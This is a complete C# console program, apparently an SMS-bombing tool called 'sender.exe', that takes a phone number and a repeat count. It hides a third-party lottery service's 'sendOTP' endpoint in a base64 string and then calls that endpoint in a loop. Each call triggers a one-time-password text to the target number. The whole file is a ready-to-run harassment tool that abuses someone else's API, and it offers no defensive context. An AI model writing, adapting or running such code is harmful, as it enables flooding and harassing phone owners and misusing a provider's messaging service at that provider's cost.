using System;
using System.Net.Http;
using System.Threading.Tasks;
using System.Text;

class Program
{
    static async Task SendGetRequest(string phoneNumber, int iteration_count)
    {
        string decodedUrl = Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9sb3R0ZXJ5LWFwaXMtenFta2tscDViYS1lbS5hLnJ1bi5hcHAvc2VuZE9UUC8/cGhvbmU9"));
        string fullUrl = $"{decodedUrl}{phoneNumber}";

        for(int i=1; i<=iteration_count; i++){
            Console.WriteLine($"Sending SMS: {i}");

            using (HttpClient client = new HttpClient())
            {
                HttpResponseMessage response = await client.GetAsync(fullUrl);
                string responseBody = await response.Content.ReadAsStringAsync();
                Console.WriteLine(responseBody);
            }
        }
    }

        

    static void Main(string[] args)
    {
        if (args.Length != 2)
        {
            Console.WriteLine("Usage: sender.exe <phone_number> <iteration_count>");
            return;
        }

        string phoneNumber = args[0];

        if (!int.TryParse(args[1], out int iteration_count) || iteration_count <= 0)
        {
            Console.WriteLine("Error: <iteration_count> must be a valid positive integer.");
            return;
        }

        SendGetRequest(phoneNumber, iteration_count).Wait();
    }
}
